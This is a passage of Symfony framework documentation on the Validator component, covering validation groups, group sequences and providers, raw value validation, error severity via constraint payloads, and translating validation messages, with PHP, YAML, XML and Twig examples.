Constraints in the ``Default`` group of a class are the constraints that have
either no explicit group configured or that are configured to a group equal to
the class name or the string ``Default``.

.. caution::

    When validating *just* the User object, there is no difference between the
    ``Default`` group and the ``User`` group. But, there is a difference if
    ``User`` has embedded objects. For example, imagine ``User`` has an
    ``address`` property that contains some ``Address`` object and that you've
    added the :doc:`/reference/constraints/Valid` constraint to this property
    so that it's validated when you validate the ``User`` object.

    If you validate ``User`` using the ``Default`` group, then any constraints
    on the ``Address`` class that are in the ``Default`` group *will* be used.
    But, if you validate ``User`` using the ``User`` validation group, then
    only constraints on the ``Address`` class with the ``User`` group will be
    validated.

    In other words, the ``Default`` group and the class name group (e.g.
    ``User``) are identical, except when the class is embedded in another
    object that's actually the one being validated.

    If you have inheritance (e.g. ``User extends BaseUser``) and you validate
    with the class name of the subclass (i.e. ``User``), then all constraints
    in the ``User`` and ``BaseUser`` will be validated. However, if you
    validate using the base class (i.e. ``BaseUser``), then only the default
    constraints in the ``BaseUser`` class will be validated.

To tell the validator to use a specific group, pass one or more group names
as the third argument to the ``validate()`` method::

    $errors = $validator->validate($author, null, ['registration']);

If no groups are specified, all constraints that belong to the group ``Default``
will be applied.

In a full stack Symfony project, you'll usually work with validation indirectly
through the form library. For information on how to use validation groups inside
forms, see :doc:`/form/validation_groups`.
How to Validate Raw Values (Scalar Values and Arrays)
=====================================================

Usually you will be validating entire objects. But sometimes, you want
to validate a simple value - like to verify that a string is a valid email
address. From inside a controller, it looks like this::

    // ...
    use Symfony\Component\Validator\Constraints as Assert;
    use Symfony\Component\Validator\Validator\ValidatorInterface;

    // ...
    public function addEmail(string $email, ValidatorInterface $validator): void
    {
        $emailConstraint = new Assert\Email();
        // all constraint "options" can be set this way
        $emailConstraint->message = 'Invalid email address';

        // use the validator to validate the value
        $errors = $validator->validate(
            $email,
            $emailConstraint
        );

        if (!$errors->count()) {
            // ... this IS a valid email address, do something
        } else {
            // this is *not* a valid email address
            $errorMessage = $errors[0]->getMessage();

            // ... do something with the error
        }

        // ...
    }

By calling ``validate()`` on the validator, you can pass in a raw value and
the constraint object that you want to validate that value against. A full
list of the available constraints - as well as the full class name for each
constraint - is available in the :doc:`constraints reference </reference/constraints>`
section.

Validation of arrays is possible using the ``Collection`` constraint::

    use Symfony\Component\Validator\Constraints as Assert;
    use Symfony\Component\Validator\Validation;

    $validator = Validation::createValidator();

    $input = [
        'name' => [
            'first_name' => 'Fabien',
            'last_name' => 'Potencier',
        ],
        'email' => 'test@email.tld',
        'simple' => 'hello',
        'eye_color' => 3,
        'file' => null,
        'password' => 'test',
        'tags' => [
            [
                'slug' => 'symfony_doc',
                'label' => 'symfony doc',
            ],
        ],
    ];

    $groups = new Assert\GroupSequence(['Default', 'custom']);

    $constraint = new Assert\Collection([
        // the keys correspond to the keys in the input array
        'name' => new Assert\Collection([
            'first_name' => new Assert\Length(['min' => 101]),
            'last_name' => new Assert\Length(['min' => 1]),
        ]),
        'email' => new Assert\Email(),
        'simple' => new Assert\Length(['min' => 102]),
        'eye_color' => new Assert\Choice([3, 4]),
        'file' => new Assert\File(),
        'password' => new Assert\Length(['min' => 60]),
        'tags' => new Assert\Optional([
            new Assert\Type('array'),
            new Assert\Count(['min' => 1]),
            new Assert\All([
                new Assert\Collection([
                    'slug' => [
                        new Assert\NotBlank(),
                        new Assert\Type(['type' => 'string']),
                    ],
                    'label' => [
                        new Assert\NotBlank(),
                    ],
                ]),
                new CustomUniqueTagValidator(['groups' => 'custom']),
            ]),
        ]),
    ]);

    $violations = $validator->validate($input, $constraint, $groups);

The ``validate()`` method returns a :class:`Symfony\\Component\\Validator\\ConstraintViolationList`
object, which acts like an array of errors. Each error in the collection
is a :class:`Symfony\\Component\\Validator\\ConstraintViolation` object,
which holds the error message on its ``getMessage()`` method.

.. note::

    When using groups with the
    :doc:`Collection </reference/constraints/Collection>` constraint, be sure to
    use the ``Optional`` constraint when appropriate as explained in its
    reference documentation.
How to Sequentially Apply Validation Groups
===========================================

In some cases, you want to validate your groups by steps. To do this, you can
use the ``GroupSequence`` feature. In this case, an object defines a group
sequence, which determines the order groups should be validated.

For example, suppose you have a ``User`` class and want to validate that the
username and the password are different only if all other validation passes
(in order to avoid multiple error messages).

.. configuration-block::

    .. code-block:: php-attributes

        // src/Entity/User.php
        namespace App\Entity;

        use Symfony\Component\Security\Core\User\UserInterface;
        use Symfony\Component\Validator\Constraints as Assert;

        #[Assert\GroupSequence(['User', 'Strict'])]
        class User implements UserInterface
        {
            #[Assert\NotBlank]
            private string $username;

            #[Assert\NotBlank]
            private string $password;

            #[Assert\IsTrue(
                message: 'The password cannot match your username',
                groups: ['Strict'],
            )]
            public function isPasswordSafe(): bool
            {
                return ($this->username !== $this->password);
            }
        }

    .. code-block:: yaml

        # config/validator/validation.yaml
        App\Entity\User:
            group_sequence:
                - User
                - Strict
            getters:
                passwordSafe:
                    - 'IsTrue':
                        message: 'The password cannot match your username'
                        groups: [Strict]
            properties:
                username:
                    - NotBlank: ~
                password:
                    - NotBlank: ~

    .. code-block:: xml

        <!-- config/validator/validation.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <constraint-mapping xmlns="http://symfony.com/schema/dic/constraint-mapping"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/constraint-mapping https://symfony.com/schema/dic/constraint-mapping/constraint-mapping-1.0.xsd">

            <class name="App\Entity\User">
                <property name="username">
                    <constraint name="NotBlank"/>
                </property>

                <property name="password">
                    <constraint name="NotBlank"/>
                </property>

                <getter property="passwordSafe">
                    <constraint name="IsTrue">
                        <option name="message">The password cannot match your username</option>
                        <option name="groups">
                            <value>Strict</value>
                        </option>
                    </constraint>
                </getter>

                <group-sequence>
                    <value>User</value>
                    <value>Strict</value>
                </group-sequence>
            </class>
        </constraint-mapping>

    .. code-block:: php

        // src/Entity/User.php
        namespace App\Entity;

        use Symfony\Component\Validator\Constraints as Assert;
        use Symfony\Component\Validator\Mapping\ClassMetadata;

        class User
        {
            public static function loadValidatorMetadata(ClassMetadata $metadata): void
            {
                $metadata->addPropertyConstraint('username', new Assert\NotBlank());
                $metadata->addPropertyConstraint('password', new Assert\NotBlank());

                $metadata->addGetterConstraint('passwordSafe', new Assert\IsTrue([
                    'message' => 'The password cannot match your first name',
                    'groups'  => ['Strict'],
                ]));

                $metadata->setGroupSequence(['User', 'Strict']);
            }
        }

In this example, it will first validate all constraints in the group ``User``
(which is the same as the ``Default`` group). Only if all constraints in
that group are valid, the second group, ``Strict``, will be validated.

.. caution::

    As you have already seen in :doc:`/validation/groups`, the ``Default`` group
    and the group containing the class name (e.g. ``User``) were identical.
    However, when using Group Sequences, they are no longer identical. The
    ``Default`` group will now reference the group sequence, instead of all
    constraints that do not belong to any group.

    This means that you have to use the ``{ClassName}`` (e.g. ``User``) group
    when specifying a group sequence. When using ``Default``, you get an
    infinite recursion (as the ``Default`` group references the group
    sequence, which will contain the ``Default`` group which references the
    same group sequence, ...).

.. caution::

    Calling ``validate()`` with a group in the sequence (``Strict`` in previous
    example) will cause a validation **only** with that group and not with all
    the groups in the sequence. This is because sequence is now referred to
    ``Default`` group validation.

You can also define a group sequence in the ``validation_groups`` form option::

    // src/Form/MyType.php
    namespace App\Form;

    use Symfony\Component\Form\AbstractType;
    use Symfony\Component\OptionsResolver\OptionsResolver;
    use Symfony\Component\Validator\Constraints\GroupSequence;
    // ...

    class MyType extends AbstractType
    {
        // ...
        public function configureOptions(OptionsResolver $resolver): void
        {
            $resolver->setDefaults([
                'validation_groups' => new GroupSequence(['First', 'Second']),
            ]);
        }
    }

Group Sequence Providers
------------------------

Imagine a ``User`` entity which can be a normal user or a premium user. When
it's a premium user, some extra constraints should be added to the user entity
(e.g. the credit card details). To dynamically determine which groups should
be activated, you can create a Group Sequence Provider. First, create the
entity and a new constraint group called ``Premium``:

.. configuration-block::

    .. code-block:: php-attributes

        // src/Entity/User.php
        namespace App\Entity;

        use Symfony\Component\Validator\Constraints as Assert;

        class User
        {
            #[Assert\NotBlank]
            private string $name;

            #[Assert\CardScheme(
                schemes: [Assert\CardScheme::VISA],
                groups: ['Premium'],
            )]
            private string $creditCard;

            // ...
        }

    .. code-block:: yaml

        # config/validator/validation.yaml
        App\Entity\User:
            properties:
                name:
                    - NotBlank: ~
                creditCard:
                    - CardScheme:
                        schemes: [VISA]
                        groups: [Premium]

    .. code-block:: xml

        <!-- config/validator/validation.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <constraint-mapping xmlns="http://symfony.com/schema/dic/constraint-mapping"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/constraint-mapping https://symfony.com/schema/dic/constraint-mapping/constraint-mapping-1.0.xsd">

            <class name="App\Entity\User">
                <property name="name">
                    <constraint name="NotBlank"/>
                </property>

                <property name="creditCard">
                    <constraint name="CardScheme">
                        <option name="schemes">
                            <value>VISA</value>
                        </option>
                        <option name="groups">
                            <value>Premium</value>
                        </option>
                    </constraint>
                </property>

                <!-- ... -->
            </class>
        </constraint-mapping>

    .. code-block:: php

        // src/Entity/User.php
        namespace App\Entity;

        use Symfony\Component\Validator\Constraints as Assert;
        use Symfony\Component\Validator\Mapping\ClassMetadata;

        class User
        {
            private string $name;
            private string $creditCard;

            // ...

            public static function loadValidatorMetadata(ClassMetadata $metadata): void
            {
                $metadata->addPropertyConstraint('name', new Assert\NotBlank());
                $metadata->addPropertyConstraint('creditCard', new Assert\CardScheme([
                    'schemes' => [Assert\CardScheme::VISA],
                    'groups'  => ['Premium'],
                ]));
            }
        }

Now, change the ``User`` class to implement
:class:`Symfony\\Component\\Validator\\GroupSequenceProviderInterface` and
add the
:method:`Symfony\\Component\\Validator\\GroupSequenceProviderInterface::getGroupSequence`,
method, which should return an array of groups to use::

    // src/Entity/User.php
    namespace App\Entity;

    // ...
    use Symfony\Component\Validator\GroupSequenceProviderInterface;

    class User implements GroupSequenceProviderInterface
    {
        // ...

        public function getGroupSequence(): array|GroupSequence
        {
            // when returning a simple array, if there's a violation in any group
            // the rest of the groups are not validated. E.g. if 'User' fails,
            // 'Premium' and 'Api' are not validated:
            return ['User', 'Premium', 'Api'];

            // when returning a nested array, all the groups included in each array
            // are validated. E.g. if 'User' fails, 'Premium' is also validated
            // (and you'll get its violations too) but 'Api' won't be validated:
            return [['User', 'Premium'], 'Api'];
        }
    }

At last, you have to notify the Validator component that your ``User`` class
provides a sequence of groups to be validated:

.. configuration-block::

    .. code-block:: php-attributes

        // src/Entity/User.php
        namespace App\Entity;

        // ...

        #[Assert\GroupSequenceProvider]
        class User implements GroupSequenceProviderInterface
        {
            // ...
        }

    .. code-block:: yaml

        # config/validator/validation.yaml
        App\Entity\User:
            group_sequence_provider: true

    .. code-block:: xml

        <!-- config/validator/validation.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <constraint-mapping xmlns="http://symfony.com/schema/dic/constraint-mapping"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/constraint-mapping
                https://symfony.com/schema/dic/constraint-mapping/constraint-mapping-1.0.xsd">

            <class name="App\Entity\User">
                <group-sequence-provider/>
                <!-- ... -->
            </class>
        </constraint-mapping>

    .. code-block:: php

        // src/Entity/User.php
        namespace App\Entity;

        // ...
        use Symfony\Component\Validator\Mapping\ClassMetadata;

        class User implements GroupSequenceProviderInterface
        {
            // ...

            public static function loadValidatorMetadata(ClassMetadata $metadata): void
            {
                $metadata->setGroupSequenceProvider(true);
                // ...
            }
        }

Advanced Validation Group Provider
----------------------------------

In the previous section, you learned how to change the sequence of groups
dynamically based on the state of your entity. However, in more advanced cases
you might need to use some external configuration or service to define that
sequence of groups.

Managing the entity initialization and manually setting its dependencies can
be cumbersome, and the implementation might not align with the entity
responsibilities. To solve this, you can configure the implementation of the
:class:`Symfony\\Component\\Validator\\GroupProviderInterface` outside of the
entity, and even register the group provider as a service.

Here's how you can achieve this:

 1) **Define a Separate Group Provider Class:** create a class that implements
    the :class:`Symfony\\Component\\Validator\\GroupProviderInterface`
    and handles the dynamic group sequence logic;
 2) **Configure the User with the Provider:** use the ``provider`` option within
    the :class:`Symfony\\Component\\Validator\\Constraints\\GroupSequenceProvider`
    attribute to link the entity with the provider class;
 3) **Autowiring or Manual Tagging:** if :doc:` autowiring </service_container/autowiring>`
    is enabled, your custom provider will be automatically linked. Otherwise, you must
    :doc:`tag your service </service_container/tags>` manually with the ``validator.group_provider`` tag.

.. configuration-block::

    .. code-block:: php-attributes

        // src/Entity/User.php
        namespace App\Entity;

        // ...
        use App\Validator\UserGroupProvider;

        #[Assert\GroupSequenceProvider(provider: UserGroupProvider::class)]
        class User
        {
            // ...
        }

    .. code-block:: yaml

        # config/validator/validation.yaml
        App\Entity\User:
            group_sequence_provider: App\Validator\UserGroupProvider

    .. code-block:: xml

        <!-- config/validator/validation.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <constraint-mapping xmlns="http://symfony.com/schema/dic/constraint-mapping"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/constraint-mapping
                https://symfony.com/schema/dic/constraint-mapping/constraint-mapping-1.0.xsd">

            <class name="App\Entity\User">
                <group-sequence-provider>
                    <value>App\Validator\UserGroupProvider</value>
                </group-sequence-provider>
                <!-- ... -->
            </class>
        </constraint-mapping>

    .. code-block:: php

        // src/Entity/User.php
        namespace App\Entity;

        // ...
        use App\Validator\UserGroupProvider;
        use Symfony\Component\Validator\Mapping\ClassMetadata;

        class User
        {
            // ...

            public static function loadValidatorMetadata(ClassMetadata $metadata): void
            {
                $metadata->setGroupProvider(UserGroupProvider::class);
                $metadata->setGroupSequenceProvider(true);
                // ...
            }
        }

With this approach, you can maintain a clean separation between the entity
structure and the group sequence logic, allowing for more advanced use cases.

How to Sequentially Apply Constraints on a Single Property
----------------------------------------------------------

Sometimes, you may want to apply constraints sequentially on a single
property. The :doc:`Sequentially constraint </reference/constraints/Sequentially>`
can solve this for you in a more straightforward way than using a ``GroupSequence``.
How to Handle Different Error Levels
====================================

Sometimes, you may want to display constraint validation error messages differently
based on some rules. For example, you have a registration form for new users
where they enter some personal information and choose their authentication
credentials. They would have to choose a username and a secure password,
but providing bank account information would be optional. Nonetheless, you
want to make sure that these optional fields, if entered, are still valid,
but display their errors differently.

The process to achieve this behavior consists of two steps:

#. Apply different error levels to the validation constraints;
#. Customize your error messages depending on the configured error level.

1. Assigning the Error Level
----------------------------

Use the ``payload`` option to configure the error level for each constraint:

.. configuration-block::

    .. code-block:: php-attributes

        // src/Entity/User.php
        namespace App\Entity;

        use Symfony\Component\Validator\Constraints as Assert;

        class User
        {
            #[Assert\NotBlank(payload: ['severity' => 'error'])]
            protected string $username;

            #[Assert\NotBlank(payload: ['severity' => 'error'])]
            protected string $password;

            #[Assert\Iban(payload: ['severity' => 'warning'])]
            protected string $bankAccountNumber;
        }

    .. code-block:: yaml

        # config/validator/validation.yaml
        App\Entity\User:
            properties:
                username:
                    - NotBlank:
                        payload:
                            severity: error
                password:
                    - NotBlank:
                        payload:
                            severity: error
                bankAccountNumber:
                    - Iban:
                        payload:
                            severity: warning

    .. code-block:: xml

        <!-- config/validator/validation.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <constraint-mapping xmlns="http://symfony.com/schema/dic/constraint-mapping"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/constraint-mapping https://symfony.com/schema/dic/constraint-mapping/constraint-mapping-1.0.xsd">

            <class name="App\Entity\User">
                <property name="username">
                    <constraint name="NotBlank">
                        <option name="payload">
                            <value key="severity">error</value>
                        </option>
                    </constraint>
                </property>
                <property name="password">
                    <constraint name="NotBlank">
                        <option name="payload">
                            <value key="severity">error</value>
                        </option>
                    </constraint>
                </property>
                <property name="bankAccountNumber">
                    <constraint name="Iban">
                        <option name="payload">
                            <value key="severity">warning</value>
                        </option>
                    </constraint>
                </property>
            </class>
        </constraint-mapping>

    .. code-block:: php

        // src/Entity/User.php
        namespace App\Entity;

        use Symfony\Component\Validator\Constraints as Assert;
        use Symfony\Component\Validator\Mapping\ClassMetadata;

        class User
        {
            // ...

            public static function loadValidatorMetadata(ClassMetadata $metadata): void
            {
                $metadata->addPropertyConstraint('username', new Assert\NotBlank([
                    'payload' => ['severity' => 'error'],
                ]));
                $metadata->addPropertyConstraint('password', new Assert\NotBlank([
                    'payload' => ['severity' => 'error'],
                ]));
                $metadata->addPropertyConstraint('bankAccountNumber', new Assert\Iban([
                    'payload' => ['severity' => 'warning'],
                ]));
            }
        }

2. Customize the Error Message Template
---------------------------------------

When validation of the ``User`` object fails, you can retrieve the constraint
that caused a particular failure using the
:method:`Symfony\\Component\\Validator\\ConstraintViolation::getConstraint`
method. Each constraint exposes the attached payload as a public property::

    // a constraint validation failure, instance of
    // Symfony\Component\Validator\ConstraintViolation
    $constraintViolation = ...;
    $constraint = $constraintViolation->getConstraint();
    $severity = $constraint->payload['severity'] ?? null;

For example, you can leverage this to customize the ``form_errors`` block
so that the severity is added as an additional HTML class:

.. code-block:: html+twig

    {%- block form_errors -%}
        {%- if errors|length > 0 -%}
        <ul>
            {%- for error in errors -%}
                <li class="{{ error.cause.constraint.payload.severity ?? '' }}">{{ error.message }}</li>
            {%- endfor -%}
        </ul>
        {%- endif -%}
    {%- endblock form_errors -%}

.. seealso::

    For more information on customizing form rendering, see :doc:`/form/form_customization`.
How to Translate Validation Constraint Messages
===============================================

The validation constraints used in forms can translate their error messages by
creating a translation resource for the ``validators``
:ref:`translation domain <translation-resource-locations>`.

First of all, install the Symfony translation component (if it's not already
installed in your application) running the following command:

.. code-block:: terminal

    $ composer require symfony/translation

Suppose you've created a plain-old-PHP object that you need to use somewhere in
your application::

    // src/Entity/Author.php
    namespace App\Entity;

    class Author
    {
        public string $name;
    }

Add constraints through any of the supported methods. Set the message option
to the translation source text. For example, to guarantee that the ``$name``
property is not empty, add the following:

.. configuration-block::

    .. code-block:: php-attributes

        // src/Entity/Author.php
        namespace App\Entity;

        use Symfony\Component\Validator\Constraints as Assert;

        class Author
        {
            #[Assert\NotBlank(message: 'author.name.not_blank')]
            public string $name;
        }

    .. code-block:: yaml

        # config/validator/validation.yaml
        App\Entity\Author:
            properties:
                name:
                    - NotBlank: { message: 'author.name.not_blank' }

    .. code-block:: xml

        <!-- config/validator/validation.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <constraint-mapping xmlns="http://symfony.com/schema/dic/constraint-mapping"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/constraint-mapping
                https://symfony.com/schema/dic/constraint-mapping/constraint-mapping-1.0.xsd">

            <class name="App\Entity\Author">
                <property name="name">
                    <constraint name="NotBlank">
                        <option name="message">author.name.not_blank</option>
                    </constraint>
                </property>
            </class>
        </constraint-mapping>

    .. code-block:: php

        // src/Entity/Author.php
        namespace App\Entity;

        // ...
        use Symfony\Component\Validator\Constraints\NotBlank;
        use Symfony\Component\Validator\Mapping\ClassMetadata;

        class Author
        {
            public string $name;

            public static function loadValidatorMetadata(ClassMetadata $metadata): void
            {
                $metadata->addPropertyConstraint('name', new NotBlank([
                    'message' => 'author.name.not_blank',
                ]));
            }
        }

Now, create a ``validators`` catalog file in the ``translations/`` directory:

.. configuration-block::

    .. code-block:: xml

        <!-- translations/validators/validators.en.xlf -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <xliff version="1.2" xmlns="urn:oasis:names:tc:xliff:document:1.2">
            <file source-language="en" datatype="plaintext" original="file.ext">
                <body>
                    <trans-unit id="author.name.not_blank">
                        <source>author.name.not_blank</source>
                        <target>Please enter an author name.</target>
                    </trans-unit>
                </body>
            </file>
        </xliff>

    .. code-block:: yaml

        # translations/validators/validators.en.yaml
        author.name.not_blank: Please enter an author name.

    .. code-block:: php

        // translations/validators/validators.en.php
        return [
            'author.name.not_blank' => 'Please enter an author name.',
        ];

You may need to clear your cache (even in the dev environment) after creating
this file for the first time.

.. tip::

    Symfony will also create translation files for the built-in validation messages.
    You can optionally set the :ref:`enabled_locales <reference-translator-enabled-locales>`
    option to restrict the available locales in your application. This will improve
    performance a bit because Symfony will only generate the translation files
    for those locales instead of all of them.

You can also use :class:`Symfony\\Component\\Translation\\TranslatableMessage` to build your violation message::

    use Symfony\Component\Translation\TranslatableMessage;
    use Symfony\Component\Validator\Constraints as Assert;
    use Symfony\Component\Validator\Context\ExecutionContextInterface;
    
    #[Assert\Callback]
    public function validate(ExecutionContextInterface $context, mixed $payload): void
    {
        // somehow you have an array of "fake names"
        $fakeNames = [/* ... */];
    
        // check if the name is actually a fake name
        if (in_array($this->getFirstName(), $fakeNames, true)) {
            $context->buildViolation(new TranslatableMessage('author.name.fake', [], 'validators'))
                ->atPath('firstName')
                ->addViolation()
            ;
        }
    }

You can learn more about translatable messages in :ref:`the dedicated section <translatable-objects>`.

Custom Translation Domain
-------------------------

The default translation domain can be changed globally using the
``FrameworkBundle`` configuration:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/validator.yaml
        framework:
            validation:
                translation_domain: validation_errors

    .. code-block:: xml

        <!-- config/packages/validator.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony
                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <framework:config>
                <framework:validation
                    translation-domain="validation_errors"
                />
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/validator.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework) {
            // ...
            $framework
                ->validation()
                    ->translationDomain('validation_errors')
            ;
        };

Or it can be customized for a specific violation from a constraint validator::

    public function validate($value, Constraint $constraint): void
    {
        // validation logic

        $this->context->buildViolation($constraint->message)
            ->setParameter('{{ string }}', $value)
            ->setTranslationDomain('validation_errors')
            ->addViolation();
    }
Validation
==========

Validation is a very common task in web applications. Data entered in forms
needs to be validated. Data also needs to be validated before it is written
into a database or passed to a web service.

Symfony provides a `Validator`_ component to handle this for you. This
component is based on the `JSR303 Bean Validation specification`_.

Installation
------------

In applications using :ref:`Symfony Flex <symfony-flex>`, run this command to
install the validator before using it:

.. code-block:: terminal

    $ composer require symfony/validator

.. note::

    If your application doesn't use Symfony Flex, you might need to do some
    manual configuration to enable validation. Check out the
    :ref:`Validation configuration reference <reference-validation>`.

The Basics of Validation
------------------------

The best way to understand validation is to see it in action. To start, suppose
you've created a plain-old-PHP object that you need to use somewhere in
your application::

    // src/Entity/Author.php
    namespace App\Entity;

    class Author
    {
        private string $name;
    }

So far, this is an ordinary class that serves some purpose inside your
application. The goal of validation is to tell you if the data of an object is
valid. For this to work, you'll configure a list of rules (called
:ref:`constraints <validation-constraints>`) that the object must follow in
order to be valid. These rules are usually defined using PHP code or
attributes but they can also be defined as ``.yaml`` or ``.xml`` files inside
the ``config/validator/`` directory:

For example, to indicate that the ``$name`` property must not be empty, add the
following:

.. configuration-block::

    .. code-block:: php-attributes

        // src/Entity/Author.php
        namespace App\Entity;

        // ...
        use Symfony\Component\Validator\Constraints as Assert;

        class Author
        {
            #[Assert\NotBlank]
            private string $name;
        }

    .. code-block:: yaml

        # config/validator/validation.yaml
        App\Entity\Author:
            properties:
                name:
                    - NotBlank: ~

    .. code-block:: xml

        <!-- config/validator/validation.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <constraint-mapping xmlns="http://symfony.com/schema/dic/constraint-mapping"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/constraint-mapping
                https://symfony.com/schema/dic/constraint-mapping/constraint-mapping-1.0.xsd">

            <class name="App\Entity\Author">
                <property name="name">
                    <constraint name="NotBlank"/>
                </property>
            </class>
        </constraint-mapping>

    .. code-block:: php

        // src/Entity/Author.php
        namespace App\Entity;
        // ...
        use Symfony\Component\Validator\Constraints\NotBlank;
        use Symfony\Component\Validator\Mapping\ClassMetadata;

        class Author
        {
            private string $name;

            public static function loadValidatorMetadata(ClassMetadata $metadata): void
            {
                $metadata->addPropertyConstraint('name', new NotBlank());
            }
        }

Adding this configuration by itself does not yet guarantee that the value will
not be blank; you can still set it to a blank value if you want.
To actually guarantee that the value adheres to the constraint, the object must
be passed to the validator service to be checked.

.. tip::

    Symfony's validator uses PHP reflection, as well as *"getter"* methods, to
    get the value of any property, so they can be public, private or protected
    (see :ref:`validator-constraint-targets`).

Using the Validator Service
~~~~~~~~~~~~~~~~~~~~~~~~~~~

Next, to actually validate an ``Author`` object, use the ``validate()`` method
on the ``validator`` service (which implements :class:`Symfony\\Component\\Validator\\Validator\\ValidatorInterface`).
The job of the ``validator`` is to read the constraints (i.e. rules)
of a class and verify if the data on the object satisfies those
constraints. If validation fails, a non-empty list of errors
(:class:`Symfony\\Component\\Validator\\ConstraintViolationList` class) is
returned. Take this simple example from inside a controller::

    // ...
    use App\Entity\Author;
    use Symfony\Component\HttpFoundation\Response;
    use Symfony\Component\Validator\Validator\ValidatorInterface;

    // ...
    public function author(ValidatorInterface $validator): Response
    {
        $author = new Author();

        // ... do something to the $author object

        $errors = $validator->validate($author);

        if (count($errors) > 0) {
            /*
             * Uses a __toString method on the $errors variable which is a
             * ConstraintViolationList object. This gives us a nice string
             * for debugging.
             */
            $errorsString = (string) $errors;

            return new Response($errorsString);
        }

        return new Response('The author is valid! Yes!');
    }

If the ``$name`` property is empty, you will see the following error
message:

.. code-block:: text

    Object(App\Entity\Author).name:
        This value should not be blank.

If you insert a value into the ``name`` property, the happy success message
will appear.

.. tip::

    Most of the time, you won't interact directly with the ``validator``
    service or need to worry about printing out the errors. Most of the time,
    you'll use validation indirectly when handling submitted form data. For
    more information, see :ref:`how to validate Symfony forms <validating-forms>`.

You could also pass the collection of errors into a template::

    if (count($errors) > 0) {
        return $this->render('author/validation.html.twig', [
            'errors' => $errors,
        ]);
    }

Inside the template, you can output the list of errors exactly as needed:

.. code-block:: html+twig

    {# templates/author/validation.html.twig #}
    <h3>The author has the following errors</h3>
    <ul>
    {% for error in errors %}
        <li>{{ error.message }}</li>
    {% endfor %}
    </ul>

.. note::

    Each validation error (called a "constraint violation"), is represented by
    a :class:`Symfony\\Component\\Validator\\ConstraintViolation` object. This
    object allows you, among other things, to get the constraint that caused this
    violation thanks to the ``ConstraintViolation::getConstraint()`` method.

Validation Callables
~~~~~~~~~~~~~~~~~~~~

The ``Validation`` also allows you to create a closure to validate values
against a set of constraints (useful for example when
:ref:`validating Console command answers <console-validate-question-answer>` or
when :ref:`validating OptionsResolver values <optionsresolver-validate-value>`):

:method:`Symfony\\Component\\Validator\\Validation::createCallable`
    This returns a closure that throws ``ValidationFailedException`` when the
    constraints aren't matched.
:method:`Symfony\\Component\\Validator\\Validation::createIsValidCallable`
    This returns a closure that returns ``false`` when the constraints aren't matched.

.. _validation-constraints:

Constraints
-----------

The ``validator`` is designed to validate objects against *constraints* (i.e.
rules). In order to validate an object, simply map one or more constraints
to its class and then pass it to the ``validator`` service.

Behind the scenes, a constraint is simply a PHP object that makes an assertive
statement. In real life, a constraint could be: ``'The cake must not be burned'``.
In Symfony, constraints are similar: they are assertions that a condition
is true. Given a value, a constraint will tell you if that value
adheres to the rules of the constraint.

Supported Constraints
~~~~~~~~~~~~~~~~~~~~~

Symfony packages many of the most commonly-needed constraints:

.. include:: /reference/constraints/map.rst.inc

You can also create your own custom constraints. This topic is covered in
the :doc:`/validation/custom_constraint` article.

.. _validation-constraint-configuration:

Constraint Configuration
~~~~~~~~~~~~~~~~~~~~~~~~

Some constraints, like :doc:`NotBlank </reference/constraints/NotBlank>`,
are simple whereas others, like the :doc:`Choice </reference/constraints/Choice>`
constraint, have several configuration options available. Suppose that the
``Author`` class has another property called ``genre`` that defines the
literature genre mostly associated with the author, which can be set to either
"fiction" or "non-fiction":

.. configuration-block::

    .. code-block:: php-attributes

        // src/Entity/Author.php
        namespace App\Entity;

        // ...
        use Symfony\Component\Validator\Constraints as Assert;

        class Author
        {
            #[Assert\Choice(
                choices: ['fiction', 'non-fiction'],
                message: 'Choose a valid genre.',
            )]
            private string $genre;

            // ...
        }

    .. code-block:: yaml

        # config/validator/validation.yaml
        App\Entity\Author:
            properties:
                genre:
                    - Choice: { choices: [fiction, non-fiction], message: Choose a valid genre. }
                # ...

    .. code-block:: xml

        <!-- config/validator/validation.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <constraint-mapping xmlns="http://symfony.com/schema/dic/constraint-mapping"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/constraint-mapping
                https://symfony.com/schema/dic/constraint-mapping/constraint-mapping-1.0.xsd">

            <class name="App\Entity\Author">
                <property name="genre">
                    <constraint name="Choice">
                        <option name="choices">
                            <value>fiction</value>
                            <value>non-fiction</value>
                        </option>
                        <option name="message">Choose a valid genre.</option>
                    </constraint>
                </property>

                <!-- ... -->
            </class>
        </constraint-mapping>

    .. code-block:: php

        // src/Entity/Author.php
        namespace App\Entity;

        // ...
        use Symfony\Component\Validator\Constraints as Assert;
        use Symfony\Component\Validator\Mapping\ClassMetadata;

        class Author
        {
            private string $genre;

            // ...

            public static function loadValidatorMetadata(ClassMetadata $metadata): void
            {
                // ...

